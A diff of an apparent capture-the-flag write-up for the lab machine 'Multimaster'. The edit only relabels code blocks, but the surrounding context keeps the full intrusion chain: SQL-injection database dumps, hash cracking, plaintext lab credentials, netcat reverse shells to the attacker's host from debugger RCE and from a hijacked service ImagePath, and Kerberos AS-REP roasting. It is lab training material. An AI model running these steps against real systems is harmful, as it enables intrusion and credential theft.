@@ -294,7 +294,7 @@ available databases [5]:
 
 Now let us dump all tables of `Hub_DB` by specifying the `-D Hub_DB --tables` flags.
 
-```cmd
+```bash
 [14:12:07] [INFO] fetching tables for database: Hub_DB
 [14:12:17] [INFO] retrieved: 'dbo.Colleagues'
 [14:12:23] [INFO] retrieved: 'dbo.Logins'
@@ -308,7 +308,7 @@ Database: Hub_DB
 
 Finally let us dump the Logins table by specifying the  `-D Hub_DB -T Logins --dump` flags.
 
-```cmd
+```bash
 14:13:33] [INFO] fetching columns for table 'Logins' in database 'Hub_DB'
 [14:14:09] [INFO] retrieved: 'id','int'                                                                              
 [14:14:14] [INFO] retrieved: 'password','varchar'
@@ -346,7 +346,7 @@ Now that we have successfully dumped the hashes from the database, let us try to
 
 We can use hash-identified to check what kind of hash we have.
 
-```cmd
+```bash
 root@darkness:~# hash-identifier 
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -374,7 +374,7 @@ Seems like the hash is 384 bits long and possibly is SHA-384.
 
 Checking out [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), we find two possible candidates. Trying out both hashes, we succeed cracking the hashes using mode 17900 (`Keccak-384`).
 
-```cmd
+```bash
 hashcat64.exe -m 17900 sql.hash rockyou.txt
 hashcat (v5.1.0) starting...
 
@@ -587,7 +587,7 @@ while rid <= max_rid: # Limit RID to cycle through (example: 3000)
 
 Running the python script:
 
-```cmd
+```bash
 root@darkness:~# python3 enum_domain_accounts_sqli.py 
 Domain Account enumeration using RID cycling via MSSQL-injection
 Created by Chr0x6eOs
@@ -684,7 +684,7 @@ msf5 auxiliary(scanner/winrm/winrm_login) > run
 
 The user `tushikikatomo` is allowed to login with the password `finance1` and we can read user.txt.
 
-```cmd
+```powershell
 root@darkness:~# evil-winrm -i 10.10.10.179 -u 'MEGACORP\tushikikatomo' -p finance1
 
 Evil-WinRM shell v2.3
@@ -706,7 +706,7 @@ In order to get root, we have to do a lot of lateral moving, beginning with the 
 
 We can check out local running processes using the `Get-Process` PowerShell command.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> Get-Process
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -730,7 +730,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 Seems like there are a lot of `Code` instances running. Let us check out localhost-only listening ports with their PIDs.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> netstat -anop tcp
 
 Active Connections
@@ -752,7 +752,7 @@ Seems like the high local ports (17328-65114) belong to Code (see PID). After a 
 
 We can use evil-winrm to upload the cefdebug.exe:
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> upload /root/cefdebug.exe
 Info: Uploading /root/cefdebug.exe to C:\Users\alcibiades\Documents\cefdebug.exe
                                                              
@@ -765,7 +765,7 @@ Info: Upload successful!
 
 Now that we have uploaded the binary, let us verify code-execution. First we need to execute the binary to get available sockets.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe
 cefdebug.exe : [2020/06/11 09:07:37:9131] U: There are 3 tcp sockets in state listen.
 [2020/06/11 09:07:57:9592] U: There were 1 servers that appear to be CEF debuggers.
@@ -774,7 +774,7 @@ cefdebug.exe : [2020/06/11 09:07:37:9131] U: There are 3 tcp sockets in state li
 
 Now that we got the url to a running server, we can try to execute code on it.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe --code "process.mainModule.require('child_process').exec('ping 10.10.14.22')" --url ws://127.0.0.1:22322/62bca9f3-6bfb-4c9f-936d-883afa04a191
 cefdebug.exe : [2020/06/11 09:08:06:3739] U: >>> process.mainModule.require('child_process').exec('ping -c 4 10.10.14.22')
 [2020/06/11 09:08:06:3896] U: <<< ChildProcess
@@ -782,7 +782,7 @@ cefdebug.exe : [2020/06/11 09:08:06:3739] U: >>> process.mainModule.require('chi
 
 We can verify code-execution by issuing a ping back to our machine. If we have code-execution, we should receive 4 ICMP echo-requests.
 
-```cmd
+```bash
 root@darkness:~# tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
@@ -800,7 +800,7 @@ We have received the ICMP requests and have therefore verified code-execution! L
 
 For this we will start an smb-server and serve the `nc.exe` binary. Luckily kali already has the binary located at `/usr/share/windows-binaries`.
 
-```cmd
+```bash
 root@darkness:/usr/share/windows-binaries# impacket-smbserver share `pwd` -smb2support
 Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation
 
@@ -814,14 +814,14 @@ Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corpo
 
 With the smb-server running, we just have to execute a reverse-shell instead of the ping.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> ./cefdebug.exe --code "process.mainModule.require('child_process').exec('\\\\10.10.14.22\\share\\nc.exe 10.10.14.22 443 -e powershell.exe')" --url ws://127.0.0.1:12837/9b30d829-6e07-4a2f-87be-da6542cf7668
 [2020/06/11 09:14:44:1689] U: <<< ChildProcess
 ```
 
 Checking our SMB-listener we should get a connection soon.
 
-```cmd
+```bash
 [*] Incoming connection (10.10.10.179,51386)
 [*] AUTHENTICATE_MESSAGE (MEGACORP\cyork,MULTIMASTER)
 [*] User MULTIMASTER\cyork authenticated successfully
@@ -834,7 +834,7 @@ Checking our SMB-listener we should get a connection soon.
 
 We get a connection back on our share and a shell as the user `cyork`.
 
-```cmd
+```bash
 root@darkness:~# rlwrap nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.22] from (UNKNOWN) [10.10.10.179] 51387
@@ -853,7 +853,7 @@ Now that we have a shell as Cyork, let us enumerate the system with our newly ga
 
 Looking around as Cyork, it seems like we are now allowed to read in `C:\inetpub\wwwroot`.
 
-```cmd
+```powershell
 PS C:\inetpub\wwwroot\bin> Get-ChildItem
 
     Directory: C:\inetpub\wwwroot\bin
@@ -889,7 +889,7 @@ Checking out the bin folder, `MultimasterAPI.dll` sounds interesting. Let us dow
 
 In the `ColleagueController` class we find the username (`finder`) and the password (`D3veL0pM3nT!`) for the SQL-connection. We can test for password reuse using the Metasploit module.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\alcibiades\Documents> Get-LocalUser | select Name
 
 Name
@@ -948,7 +948,7 @@ msf5 auxiliary(scanner/winrm/winrm_login) > run
 
 The user `sbauer` is allowed to login using the found password.
 
-```cmd
+```bash
 root@darkness:~# evil-winrm -i 10.10.10.179 -u 'MEGACORP\sbauer' -p 'D3veL0pM3nT!'
 
 Evil-WinRM shell v2.3
@@ -966,7 +966,7 @@ Now that we are sbauer, let us enumerate the domain using Bloodhound.
 
 Let us run [BloodHound.py](https://github.com/fox-it/BloodHound.py), which is Python based ingestor for BloodHound. The advantage of using this instead of SharpHound is that we don't have to worry about AV.
 
-```cmd
+```bash
 root@darkness:~# bloodhound-python -u sbauer -p 'D3veL0pM3nT!' -c All -d megacorp.local -dc multimaster.megacorp.local -ns 10.10.10.179
 INFO: Found AD domain: megacorp.local
 INFO: Connecting to LDAP server: multimaster.megacorp.local
@@ -997,13 +997,13 @@ Mapping out the domain trust we see that `SBauer` has write permissions over `Jo
 
 As we have `GenericWrite` over `Jorden` we can change the `does not require preauth option`, which makes the account susceptible to Kerberoasting.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $true
 ```
 
 Now we can get the TGT of the user using Impackets [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py).
 
-```cmd
+```bash
 root@darkness:~# GetNPUsers.py MEGACORP/jorden -format hashcat -no-pass -dc-ip 10.10.10.179
 Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright 2020 SecureAuth Corporation
 
@@ -1013,7 +1013,7 @@ $krb5asrep$23$jorden@MEGACORP:bf2ccdb347ff395a1d6a7ea9248121b8$43c4a929a6fb3917a
 
 Now we can crack the hash using hashcat.
 
-```cmd
+```bash
 .\hashcat64.exe -m 18200 jorden.hash rockyou.txt
 hashcat (v5.1.0) starting...
 
@@ -1074,13 +1074,13 @@ Stopped: Thu Jun 11 20:40:51 2020
 
 We cracked the hash of `Jorden` and got the password `rainforest786`. Now we can revert our changes again to stop others from skipping our previous steps and immediately privesc to Jorden from Initial Shell (this is a design issue this box has. Maybe a automated job to revert the changes every couple of minutes would have helped...).
 
-``` cmd
+``` powershell
 *Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $false
 ```
 
 We can now use evil-winrm and login with the cracked password.
 
-```cmd
+```bash
 root@darkness:~# evil-winrm -i 10.10.10.179 -u 'MEGACORP\jorden' -p 'rainforest786'
 
 Evil-WinRM shell v2.3
@@ -1098,7 +1098,7 @@ Now that we have a shell as `Jorden` let enumerate the system.
 
 Checking out the permissions for the services.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\jorden\Documents> $acl = Get-ACL "HKLM:\System\CurrentControlSet\Services"
 *Evil-WinRM* PS C:\Users\jorden\Documents> ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
 NT AUTHORITY\Authenticated Users: AccessAllowed (ExecuteKey, ListDirectory, ReadExtendedAttributes, ReadPermissions, WriteExtendedAttributes)
@@ -1113,7 +1113,7 @@ BUILTIN\Server Operators: AccessAllowed (CreateDirectories, Delete, ExecuteKey, 
 
 We can now simply change the `ImagePath` (binary location) of any service and start it. The service will execute the `ImagePath` as a privileged process giving as full access over the system. The `ImagePath` can be simply changed to a reverse-shell payload as done previously (RCE via Visual Code debugger).
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\jorden\Documents> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /v ImagePath /t REG_EXPAND_SZ /d "\\10.10.14.22\share\nc.exe -e powershell.exe 10.10.14.22 443" /f
 The operation completed successfully.
 
@@ -1130,7 +1130,7 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuauserv
 
 We get a connection on our SMB-listener.
 
-```cmd
+```bash
 [*] Incoming connection (10.10.10.179,52287)
 [*] AUTHENTICATE_MESSAGE (MEGACORP\MULTIMASTER$,MULTIMASTER)
 [*] User MULTIMASTER\MULTIMASTER$ authenticated successfully
@@ -1140,7 +1140,7 @@ We get a connection on our SMB-listener.
 
 We get a shell as `nt authority\system` and can read `root.txt`.
 
-```cmd
+```bash
 root@darkness:~# rlwrap nc -lvnp 443
 listening on [any] 443 ...
 connect to [10.10.14.22] from (UNKNOWN) [10.10.10.179] 52297
@@ -1151,7 +1151,7 @@ PS C:\Windows\system32> whoami
 nt authority\system
 ```
 
-```cmd
+```powershell
 PS C:\Users\Administrator\Desktop> type root.txt
 001e7***************************
 ```
@@ -1160,7 +1160,7 @@ PS C:\Users\Administrator\Desktop> type root.txt
 
 Another possible way to get root.txt is to exploit our `SeBackupPrivilege`. This allows us to create backups of any files, whilst not restoring their permissions. This gives us arbitrary read access.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -1181,7 +1181,7 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 
 Checking our privileges, we see that we have the `SeBackupPrivilege`. With these privileges we can backup the desktop of Administrator.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\temp> robocopy C:\Users\Administrator\Desktop . /b
 
 -------------------------------------------------------------------------------
@@ -1218,7 +1218,7 @@ Checking our privileges, we see that we have the `SeBackupPrivilege`. With these
 
 After backing up the desktop, we can read `root.txt`.
 
-```cmd
+```powershell
 *Evil-WinRM* PS C:\temp> dir
 
 
